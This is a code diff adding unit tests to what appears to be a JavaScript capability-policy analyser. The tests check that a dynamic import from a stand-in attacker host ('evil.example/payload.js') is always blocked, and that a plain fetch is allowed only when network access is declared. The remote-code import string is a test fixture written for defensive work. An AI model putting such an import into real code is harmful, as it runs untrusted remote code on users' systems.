@@ -106,6 +106,22 @@ describe('analyseJavaScript', () => {
   })
 })
 
+describe('dynamic import (#137)', () => {
+  const source = `import('https://evil.example/payload.js')`
+
+  it('blocks import() whether or not network is declared', () => {
+    expect(blocks(source, [])).toBe(true)
+    expect(blocks(source, ['network'])).toBe(true)
+  })
+
+  it('still lets a plain fetch through once network is declared', () => {
+    // Control: declaring network must keep unlocking requests, otherwise the
+    // test above could pass because everything blocks.
+    expect(blocks(`fetch('https://example.com/collect')`, ['network'])).toBe(false)
+    expect(blocks(`fetch('https://example.com/collect')`, [])).toBe(true)
+  })
+})
+
 describe('applyCapabilityPolicy', () => {
   it('raises undeclared capability use from warn to block', () => {
     const outcome = analyseJavaScript(`fetch('https://example.com/collect')`)
